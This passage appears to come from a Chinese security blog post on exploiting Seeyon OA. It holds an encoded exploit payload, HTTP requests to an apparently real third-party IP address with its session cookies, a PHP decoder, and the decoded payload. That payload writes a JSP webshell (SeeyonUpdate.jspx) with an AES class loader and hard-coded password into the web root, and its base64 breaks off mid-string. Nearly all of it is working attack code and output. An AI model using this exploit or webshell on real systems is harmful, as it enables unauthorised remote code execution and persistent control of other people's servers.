8%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">500</span> </span><br><span class="line"><span class="attribute">Pragma</span>: No-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 51</span><br><span class="line"><span class="attribute">Date</span>: Wed, 16 Sep 2020 08:56:43 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Server</span>: SY8045</span><br><span class="line"><span class="attribute">Set-Cookie</span>: BIGipServer~CMEW-PRD-DMZ~pool_cmew-pms-lb_http80_CMEW-PRD-DMZ_prd=rd62o00000000000000000000ffff644e0303o80; path=/; Httponly</span><br><span class="line"></span><br><span class="line">&#123;"message":null,"code":"0246603709","details":null&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/seeyon/SeeyonUpdate1.jspx</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">202.105</span><span class="number">.134</span><span class="number">.19</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="number">10.15</span><span class="string">;</span> <span class="string">rv:80.0)</span> <span class="string">Gecko/20100101</span> <span class="string">Firefox/80.0</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">JSESSIONID=1EE0AC538A01698F6B502A186FABFEA8;</span> <span class="string">BIGipServer~CMEW-PRD-DMZ~pool_cmew-pms-lb_http80_CMEW-PRD-DMZ_prd=rd62o00000000000000000000ffff644e0303o80;</span> <span class="string">loginPageURL=</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/html;charset=utf-8</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">508</span></span><br><span class="line"><span class="attr">Date:</span> <span class="string">Wed,</span> <span class="number">16</span> <span class="string">Sep</span> <span class="number">2020</span> <span class="number">08</span><span class="string">:51:48</span> <span class="string">GMT</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"><span class="attr">Server:</span> <span class="string">SY8045</span></span><br></pre></td></tr></table></figure>



<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&lt;?php $s = urldecode(<span class="string">"%1F%C2%8B%08%00%00%00%00%00%00%00%C2%B5X%5B%C2%93%C2%A2J%12%7E%C3%9E%C3%BD%15F%C2%BF%C3%B4L%C3%8Cl%0F%C2%A2%C3%8C%0C%7Bb%1ED%05%11%C2%A5%5B%C2%90%C3%AB%C3%86%3E%C3%88%C2%A5%01%29.%C3%93%C2%80%C2%8A%13%C3%A7%C2%BFo%16%17%C3%85%C3%96%C3%AE%C2%9D%C3%98%C3%98c%C2%84%21B%C2%91%C2%95%C2%95%C3%B9%7D_f%C3%95%C2%BF%7E%C3%9D%3F%27%2FQ%C2%816%C3%AB2u%C3%AF%C3%BF%C3%99%C3%AB%7F%C3%AE%C2%B5w%C3%84M%C2%84%C3%AF%C3%9C%C3%A7n%C2%96%C3%9F%C2%9FoO%0F%C3%A9%C2%8B%C2%9BeA%12%C3%A3%C2%87r%C3%BE%12%C3%84%5E%2F%C3%9D%C3%A4%7E%C3%AFG%C3%AF%C3%AE%C3%A1%C3%A1%C3%8B%C3%9E%C2%B56i%C2%9A%7D%C3%89%5C%C2%B7L%C3%A2%2Fw%7F%C3%BC%C2%BDW%7F%C3%BE%C2%B6%C3%9D%C3%AC6%0FA%C3%B2%C3%B0%04%C2%AF%C3%A4%C3%9AK%C2%90%C2%BB%2F%C2%BD%C3%B4%7CM%C2%82%C2%81%C3%98%C3%9D%C3%B7n%0C%C3%BB%C2%80%C3%AD%7F%C2%BA%C2%93%2B%C2%93J%C3%AAlr%C3%B7a%C2%9B%C2%A5%C2%87%C2%BB%C2%8F%27%C3%AB%C2%BD%C3%86%C2%93%C3%8Cw%11%C3%82%C2%AE%3Cq%C3%A9%C3%91%C2%9E%C2%A4%C2%A5E%C3%92%04%3F%C3%B3s%C2%8B%C2%A3%C2%8E%C2%8F%11%C2%BEG%04%C2%9B%C2%99D%C3%98%C2%93d%C2%B7+S%C3%9F%C2%89%C2%A6%C2%85%3DP%C2%8BE%24%C3%AE%2C%C2%99%16%C2%94%C3%BEh%C2%A7pll%C3%8A%C2%BC%C3%A7Dji%C2%93hgm%C2%89%60%29%0FK%7E%3B%C3%BC%C2%BE%C2%89%C3%85%C3%BDc%24%C2%A5v%C2%A4n%1D%0E%C2%91%C2%A6L%C3%AD%0D%C3%8DA%3C%C2%87r%C2%9B%C2%A3K%07%C3%9B%C2%8FX%C3%92%C2%90%C2%A9%3E%3C%C3%8F%16A%C2%92U%C3%BFu%C2%AF0%06s%C3%8A%C2%9EI%C2%BB%C2%9B%C3%B7%C3%80%C2%AE%C2%A9-%0B%21%C3%A0wO%C3%9B%C3%83O%7B0%C3%BAjr%C3%AA%C3%96%C3%A2%C3%98%C3%92%C3%90%C2%A5%C3%94%22%C2%87%C2%9F%C3%86%C2%AAH%C3%98%11*%C3%8C%C2%92%19%1A%C3%A5%C2%88%C3%A6%C3%87%3C%C2%B5%5C%C3%8F%C2%91q%C3%B4%C3%B6K%C2%92%2F%0DR%21%1E5%C2%85%C3%A0%C2%B7%C2%99%C3%87%C2%8FG%C2%9E2%C2%90%C3%8A%C2%8DF%C3%85%C3%BC%C2%8C%C3%B1%C3%AD%C3%81%C3%92%7B%C2%92G%C2%81%C2%A1%C2%8B%C2%A1%19%C3%A5%3FM%C3%9D%C3%B1M%C3%8E%08%1E%C3%8B%11%C2%8Ce%C3%96%C3%8El%C2%9EZ%C2%91%C3%ADY%C3%9A%C2%AA%C3%8FO%C2%88%C3%AAWh%C3%9E%13%C2%AA%C3%B9%C3%82o%C3%98%26%C3%8F%C2%89%19%C3%988%C3%B2%C2%AC%C3%A7%C2%99%C2%BAO%C2%98%1A%15%C3%9A%253%01%3F%C2%8F6q%C3%98%19%C2%9A%C2%84%C3%AC%C2%80%C2%A9%C3%87V_f%C3%AFh%C3%B3l%C2%A3-%3Dm%C3%AC%C2%BF%1E%C3%B7U%C2%90%C2%BBc%C3%AB%2F%C3%A4co%C3%AA%7C%C3%A2%06a%C3%97%0E%7D%C3%8B%C3%A6%C2%8A%3CT%3E*%C2%B2%1F%C2%B8%C2%BA%C2%84%C2%B4%3E%C3%A1%19%24%C2%9F%C3%B2%C2%B3%C3%8C%C2%BB%C2%B4%C3%8B%C2%94%C2%A6.%C3%B5%C3%ADh%C3%98%C3%9A%2F+%C2%BE%11%C3%84%0756%12x%2F%C3%A3%27%C2%A3%0C%C3%96%18%2C%C2%A2%03%C2%B2%22%C2%87%C3%98%C2%8Co%C3%B80%23j%3Fgj%60qh%C3%8Bss%C3%8A%C3%A1TK%C2%97%C2%99%C2%A1p%C2%BE%3E.%C3%86L%00%C3%B8%C3%8BL%C2%8D-x%C2%8E%C2%B8%C3%B4i%26%C2%95%C3%AE%C2%8D%C2%B5_%C3%A1%22%14S%C2%9B%C3%B3q%C2%AC%C2%B68%2Fo%3F%C2%A7bX%C3%9F%C3%9C%C2%8AE%C3%82%C3%90%C2%A8%C2%AD%29%7B%C3%81JQ%C3%97%C3%BCE%0C%C3%AB%C2%AFQR%C2%90kD%08%1C%C3%A1%3D%C2%95%C2%A3%03%3FI%C2%BCe%C2%B0%C3%B7%C2%ACH%1D%C3%B0%1C%C3%A6%04%3B%04%3E%C2%94%C2%AE%C3%8E%10VI%1Dm%C3%80%C3%A1%02%C2%89%08%C3%A6D%C3%8E4G%C2%AEZa5q%C2%B9ea%C2%92*%C2%B1%C2%8A%11a%C3%AA%C3%8BD%C2%90%C3%B7%1E%1F%C2%B2%C2%ACR%C3%B2%C2%A9%C2%B0%7E%3B%C3%BE0%7Fh%11%26%C3%B8%C3%80f%C3%82l%C2%99%C3%96%18%C2%AC%C2%BF%C3%8F2%C2%B3%05%C2%BCo7%C3%A3Q%22%C3%A9%C3%BE%C3%96%04%1F6%1A%0D%C3%B1S%C3%9E%C3%8D%C2%A9%15%C2%AB%C2%995%C3%A9%C3%86%C2%97h%C3%AC%5D%C3%A2%C3%85%1EH%C2%BE%C2%83s%C3%86%C2%9E%C2%B8%C2%94%C2%9B%13%259sey9%C3%8Fy%1C%C3%8C%C2%B5%02%0E1%C2%85%C2%A3%1D%C2%B2%C2%AE%C3%8F%C3%80%1D%C3%AA%C2%86o%3F%0D%C3%9D%C3%B4%C2%81%C3%97%107%C2%B5%C3%9C%C3%A8%12%C2%B5%08%C3%BB%C3%88%1E%C2%88%3E%C3%84l%C2%BA%01%C3%8D%C2%B0%07%2B%C3%8F%C2%BA%C2%8ES%7E%C3%8A%C2%B3L%1DMM%C2%84%C3%B5%21%C3%82%C2%95%29%C3%91%04%C3%9Ea%C2%AD%C2%918%04%C2%B9%16%C2%89E%C3%A4%40%3EP%C2%81%C3%97dE%22%12%C3%86sQ%C2%9A%28%C3%81%C2%8D%C3%98%C3%A7%C2%8B%180%C3%8F%C2%B1%C2%84%29%C3%BB%C3%87%C3%BA%C2%BD%0A%C2%A7Ga%1C%C3%96%C2%98%C2%9F-%0B%C2%8BS%0Bs+%25p%C3%AF%22%27u%3C%21%C3%B7c%C3%90%1C%C2%8EBN%C3%99%C2%AC-%C3%AAC%2C%C2%BDb%15%C2%A1X%C3%96%28%C3%90%02XS%C3%A0%1D%16x%3E%C3%90HX%C3%A7%C3%91%19%7B%C2%A9+S%C2%84%C3%95o%C3%A3%C3%A8%1D%C3%84+%2C%1C%C2%8EV%C3%AD%19%C2%83%C3%ACP%C3%B4mRI.%7C%C2%9Ea%0E%C2%B3%C2%84Az%C2%9E0U%C2%87%06%C2%A9%C3%AE%21g%3B%2B%60%C3%90%C2%A5%5E%5Ch%C3%82%C2%99%C3%9F%C2%91J4%C2%BA%C3%96%C3%B0%C2%95%C3%A9%1B%C3%91%215J%C3%A6%C3%A8%40%0C0%0EN%C3%B9%C3%A6%C3%A6x%7ER%C2%9C%C2%AA%C2%85A%C3%92%C2%A1%C3%99%C3%95%C2%91%18cAJ%C3%AC%C2%88%1E%C2%80%C3%86%C2%B1.%27%22%C3%A0%1C%C3%96b%C3%8F%C3%AD%C3%84%C2%A7%C3%95+%23b%C2%8F%C3%A6%C3%9A+%C2%BA%C2%B1%3B%C3%A3%C3%8A%C3%B4%C2%AD%C2%99%C2%8A*m%C2%BD%C3%82%C3%AAm-h%C3%AD%C3%A1w%C2%9A9%0A3%C2%A2%C3%8Bu%C3%84%C3%A6%C2%98%C3%9F%17u%26l%C3%961%C3%A6%C2%AFs7%C2%A5a%2C%C3%94%C2%AB1%C3%83%02Nv%C2%A0%7B%25%C2%B6%C3%99%C3%9A%C2%AF%C3%B1%C3%90G%0E%C3%A7%C3%AF%C3%8C%C2%B1%17%60NK%C2%A0%21%16%C2%895%1A4%C2%91%C2%A3%C3%BA%16%C2%B7O%17%C2%90%3F%27%C2%A2_p%C2%8C%C2%A0%06+q%C2%BB%3A%3D%C2%BB%C3%86%C3%8By%C2%BD%C3%82%C2%89C%C2%A1w%C2%B6%5B%C3%A9U%5D%0FJ%2F%C2%BD%C3%B2%C2%A1%19%C2%A7rt%5B%C2%9B%02%C3%80U%01u%C2%AB%7E%C2%A7%C2%9F%3B.%C3%99j-%C2%B5%C2%AD%C3%AE%0D%C2%88%C2%AE%C2%8F%C2%A7%C2%B5%C3%96%C3%AF%C3%99%C3%9E%C2%9A%C2%9C%C3%BF%04%3E%11Z%C2%BF%C3%BF%C3%8D%C2%88E%C3%BA%7F%C3%83%C3%9C%7B%C2%9C%C3%BF%C2%BD%C2%BC%C3%95%C3%BDF%3F%C2%B5%C3%89e%C2%B1%0A%C3%99%C2%B5%04c%3B%C3%B1%C2%BE%C2%8Ee%C2%8D%C3%AF%27%23JAKV%C2%9D%18b%3E%C2%B6y%C2%A7pl%C2%BA%C3%BA%C3%BF%C2%96%1D%C3%92%C3%90%0E%7DS%C3%86%C3%BD%C2%83%C3%9F%C3%866%C3%A5%5B%C3%BC%C3%A3%C2%BA%C2%885%C2%BD%C2%A9%C2%89%C3%80%5D%C2%9C%27%C3%90%1E%29%C2%B1%C3%88U%C3%82G-O*%5C%60-%C3%B8k%C3%B2%C3%91%C2%8D5%C3%94%09GS%C2%B0%C3%B66%C2%BES%C3%80u%263%C2%B4J%C3%B3l%0Bct%C3%8C%07%C3%82%C2%AB%C3%BBv%7B%C3%BFZ%0F%21n%22h%C2%97%C2%98%40%0C.xm%C2%AEo%C3%B6%0E%C3%B4%1B%C3%97%27%C3%8Di%7C%C3%BCv%C2%B3%3F%C2%98AN%C2%A0%C2%87%03%C3%BD9kK%C2%83%11%09%C3%B7x%C2%90%C3%8B3G%C2%98%C3%80%06%C2%9E%00%0FJk%C3%A0%1C%C3%B9K%2Cv%C2%B5%C2%AF%C3%A1%0E%C3%93r%C2%B1%C3%BB%C3%AC4O%27v%C2%BF%5B%C2%B7Z%7B%C3%B8%C2%9Df%0E*%C2%B2%06%C3%B3GC%C3%AB%C3%A3%C2%B86uM%05%1D%C3%9D%C2%83%C3%B67X%C2%BF%C3%91g%C2%B4%C3%B9%C3%A59%095%C3%98%C3%826%5B%C3%BB%15%C3%8E%C3%96%1A%C3%98%C3%A1%C3%A8%10%C3%ACb%C2%9CMa%7C%C2%ADO%C2%B8%1F%C3%81%3A9%0E%0B%C3%90O%C3%92%22s%24%C2%9C%C2%B0%7Ezv%C3%8D%C3%8B%C3%93zG%C2%89%C2%81%C3%BB%125w%C2%80%C2%BFak%C2%B7%C3%96%C2%99%C2%BA%C2%87%C2%85%3A%C3%B7%C3%9A%C2%87f%C2%9C%12%C2%B4%18%C2%ADy+Z%C2%BA%C2%9E%C2%B7%5C%01%C3%BCW%C3%B7h%C3%80%5Bj%C3%85%C3%A6n%03%C3%B5%C3%8Bl%C3%B2h%C2%B7%7DT%C2%AB%C2%B9l%C3%85%C2%8B%C3%A3%C2%B3%C3%BC%C2%AA%C2%8F%7C%0B%7FrxQ%5B%C3%9E%C2%AB%0F%C3%95%C3%B7%14%13%C3%A0s%C2%B3%C2%AEEd%C3%AE%C3%AC%C2%90%C3%B2-MI%C3%B8X%C3%AC%5B%01%C2%95otq%0B5%C2%82Q%08%5C%C3%ABN%C3%B9%C2%B8%C3%81%C2%8D%C3%9F%C3%8B%1D%5E%23%C3%94%7C%5CO%21%1E%C2%AF%C3%AA%C3%B7%C3%BF%3D%1F%C3%AA%C3%98%C3%91%C3%8C%08%C3%BB%C3%BB%C3%97%C3%A6%C3%A5%C2%BF%C3%B6%C2%A0%C3%A5%C2%ADZP%C3%B7%C2%98%C3%97%C3%97%C2%B8%0Fq%C3%B4y%C3%91%C3%96%C3%82%C2%B6%27y%1A%C3%937%C3%B7w%C3%8D%C2%9E%C3%B5%08%7Dv%0Ax%C3%88%C2%A0%C3%9F%C3%BC%C3%94%C3%A5h%1B%3F%C3%88%09%60g%C3%9A%C3%89G%C3%8B%1B%05z%15%C3%B5%C3%A0h%C2%B8%C3%AF%C2%AAt%7Be%C3%A8s%C3%80%C2%81J%C3%A0%C3%BD%C2%94%5Dq%C2%B9%C3%AD%C3%AD%C2%98%10%C3%A6%C3%B5q%C2%8Dr%C3%87%7Eu%0D%C2%B1%C2%8D%40_%C2%8Ff%1B%13%0EE%C2%80%C3%8F%23%C3%AE%3B%C3%B1%C3%BA%C3%AB%5C%C2%B1%04%C2%8E%C2%B7%01%C3%BC%C2%AFj%19%C3%87R%16G%C3%BB%26%C3%B4%1D%60%C2%8Bn%C3%BB%C2%81%C3%8B%C2%BD%C2%8E%C2%88%C3%BB%5E%C2%BC%C3%86%C3%82%C3%86%C2%B5E%C2%97%C2%B0%C3%96%05%0Eh%14%C3%A4xo%C3%A8%28%C2%B3H6%C3%A4%C3%9B%1C%C2%B1%1E%C3%B656%15%C3%98%C2%93%C3%87%12rg%C2%AB%5B5%C3%A9%C3%95%5E%C2%B2%C3%AA3%25%C2%A1%C2%8E%C3%8Di%C3%BF%01%C2%B9D%16%C3%8C%7F%C3%A9%C3%8F%1C%C3%99%C2%BA%C2%8A%C3%BB%C3%AF7%C3%BCic6%3F%C2%9E%7Dj%C3%B5%C2%B9%C2%8E%C2%95p%C3%89%C3%A7Sm6qM%1E%7BI%C3%A3k%C3%9A%5D%C2%BB%C3%B9%C3%AE%C3%9AC%C2%A8%C2%95PO%C2%89n%3F%7F1G%C2%B4%C2%A8r%C3%8Bfv%C3%A9Wg%0E%2B%C2%92%C2%86%3EZ%1D%3A%C2%97%C3%A3%C2%A0%26%C2%89%7B%C2%8B%C2%84%C2%BDC%1D%27%1D%C3%AF%1Fp%C3%BE%21%3E%C2%83%C3%AAZ%C3%B6%C3%B1%C2%9E%07%C2%9F%7B%40%2FR%C3%B7%C2%A7%02%C3%9E%03L%C2%A6%C3%A4%C2%ABu%C3%BD%C2%8E%C2%AD%16%C2%83M%7DW%12%C3%80%C3%93%15.%C3%8D%C3%A0b%0F%C2%90%C3%A2%C2%BD%22%C3%A0%08jyx%C2%B9W%C3%84%C2%B9%190%C2%90w%11Uxc%1D%C2%BCw%C2%AA%C3%B2%C2%BB%C2%88%C3%ABk%C2%81%C3%AB%C2%87%22%C3%AC%C2%8D%60Owl%C2%B8%C2%9F%2C%C3%97%C3%869%C3%A7%C3%BA%C3%BB%C2%BD%C3%9C%C3%B3z%C2%BF%C2%AB%C3%8Eqbq%0B%C3%BE%C3%80%C2%B3%03r%26%C3%83%C3%AF%0B%C3%B2%7Cf%C3%B4%C3%A4%C3%BD%C3%B8q%3E%C2%BC%C3%AAeE%C3%BC%10%05%C2%99%C3%BD%C3%80%C2%8C%C3%A4%C3%A9%C3%97%C3%A1%C3%84%C2%B5%13%C3%87%7D%C3%A99%C3%8Do%7Dtu%7B%C3%90%C2%87%C3%ABS%C2%AA%C3%BA%C2%B5%C3%A6O%C3%BDn%C3%BD%C3%A7Cc%C3%B0%C2%A1%C3%BEe%C2%8A%C3%A7g0P%1Dj%7D%C3%BC%7C%C2%A7%C2%AC%C3%99%7F%7C%C3%AF%1Ezu%C2%8F%C3%8F%1E%C2%AA%3F%28%C3%BE%C3%905%C3%BE%C3%96X%1B%25%C2%99%0B%C2%8E%C3%BD%C3%B9%07%3E%C3%9E%C2%83%0B%C3%87%7D%C3%AEe%C3%B9%26%0F%C3%AC%C3%9E%C3%A1p%C3%B8%C3%B0%C3%B1%C3%97%C3%BD%C2%9F%C2%9F%7B%C3%B7%C3%B7%C2%9F%7B%C2%BF%C3%B0o%C3%BER%C2%B8%C3%B7%C3%BF%C3%BE%0F%C2%A7%C3%92%C3%BC%C2%90.%14%00%00"</span>);</span><br><span class="line"></span><br><span class="line">$s = iconv(<span class="string">"UTF-8"</span>,<span class="string">"latin1"</span>,$s);</span><br><span class="line">$s = gzdecode($s);</span><br><span class="line">echo $s;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">'formulaType'</span>: <span class="type">1</span>, <span class="string">'formulaName'</span>: <span class="type"></span>'test<span class="string">', '</span>formulaExpression<span class="string">': '</span><span class="keyword">String</span> path = <span class="string">"../webapps/seeyon/"</span>; java.io.PrintWriter printWriter2 = <span class="keyword">new</span> <span class="type">java</span>.io.PrintWriter(path+<span class="string">"SeeyonUpdate.jspx"</span>); <span class="keyword">String</span> shell = <span class="string">"PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+CVN0cmluZyB4YyA9ICI5MTJlYzgwM2IyY2U0OWU0IjsgICAgU3RyaW5nIHBhc3MgPSAiYXNkZmtqZXdhZGYiOyAgICBTdHJpbmcgbWQ1ID0gbWQ1KHBhc3MgKyB4Yyk7ICAgIGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlciB7ICAgICAgICBwdWJsaWMgWChDbGFzc0xvYWRlciB6KSB7ICAgICAgICAgICAgc3VwZXIoeik7ICAgICAgICB9ICAgICAgICBwdWJsaWMgQ2xhc3MgUShieXRlW10gY2IpIHsgICAgICAgICAgICByZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7ICAgICAgICB9ICAgIH0gICAgcHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLCBib29sZWFuIG0pIHsgICAgICAgIHRyeSB7ICAgICAgICAgICAgamF2YXguY3J5cHRvLkNpcGhlciBjID0gamF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICAgICAgICAgICAgYy5pbml0KG0gPyAxIDogMiwgbmV3IGphdmF4LmNyeXB0by5zcGVjLlNlY3JldEtleVNwZWMoeGMuZ2V0Qnl0ZXMoKSwgIkFFUyIpKTsgICAgICAgICAgICByZXR1cm4gYy5kb0ZpbmFsKHMpOyAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsgICAgICAgICAgICByZXR1cm4gbnVsbDsgICAgICAgIH0gICAgfSAgICBwdWJsaWMgc3RhdGljIFN0cmluZyBtZDUoU3RyaW5nIHMpIHsgICAgICAgIFN0cmluZyByZXQgPSBudWxsOyAgICAgICAgdHJ5IHsgICAgICAgICAgICBqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTsgICAgICAgICAgICBtID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTsgICAgICAgICAgICBtLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpOyAgICAgICAgICAgIHJldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTsgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7ICAgICAgICB9ICAgICAgICByZXR1cm4gcmV0OyAgICB9ICAgIHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24geyAgICAgICAgQ2xhc3MgYmFzZTY0OyAgICAgICAgU3RyaW5nIHZhbHVlID0gbnVsbDsgICAgICAgIHRyeSB7ICAgICAgICAgICAgYmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOyAgICAgICAgICAgIE9iamVjdCBFbmNvZGVyID0gYmFzZTY0LmdldE1ldGhvZCgiZ2V0RW5jb2RlciIsIG51bGwpLmludm9rZShiYXNlNjQsIG51bGwpOyAgICAgICAgICAgIHZhbHVlID0gKFN0cmluZykgRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXdDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W117YnN9KTsgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7ICAgICAgICAgICAgdHJ5IHsgICAgICAgICAgICAgICAgYmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyAgICAgICAgICAgICAgICBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyAgICAgICAgICAgICAgICB2YWx1ZSA9IChTdHJpbmcpIEVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImVuY29kZSIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W117YnN9KTsgICAgICAgICAgICAgICAgdmFsdWUgPSB2YWx1ZS5yZXBsYWNlKCJcbiIsICIiKS5yZXBsYWNlKCJcciIsICIiKTsgICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZTIpIHsgICAgICAgICAgICB9ICAgICAgICB9ICAgICAgICByZXR1cm4gdmFsdWU7ICAgIH0gICAgcHVibGljIHN0YXRpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBicykgdGhyb3dzIEV4Y2VwdGlvbiB7ICAgICAgICBDbGFzcyBiYXNlNjQ7ICAgICAgICBieXRlW10gdmFsdWUgPSBudWxsOyAgICAgICAgdHJ5IHsgICAgICAgICAgICBiYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7ICAgICAgICAgICAgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7ICAgICAgICAgICAgdmFsdWUgPSAoYnl0ZVtdKSBkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGUiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtde2JzfSk7ICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgeyAgICAgICAgICAgIHRyeSB7ICAgICAgICAgICAgICAgIGJhc2U2NCA9IENsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgICAgICAgICAgICAgICAgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgICAgICAgICAgICAgICAgdmFsdWUgPSAoYnl0ZVtdKSBkZWNvZGVyLmdldENsYXNzKCkuZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBuZXcgQ2xhc3NbXXtTdHJpbmcuY2xhc3N9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtde2JzfSk7ICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7ICAgICAgICAgICAgfSAgICAgICAgfSAgICAgICAgcmV0dXJuIHZhbHVlOyAgICB9PC9qc3A6ZGVjbGFyYXRpb24+PGpzcDpzY3JpcHRsZXQ+dHJ5IHsgICAgYnl0ZVtdIGRhdGEgPSBiYXNlNjREZWNvZGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIocGFzcykpOyAgICBkYXRhID0geChkYXRhLCBmYWxzZSk7ICAgIGlmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpID09IG51bGwpIHsgICAg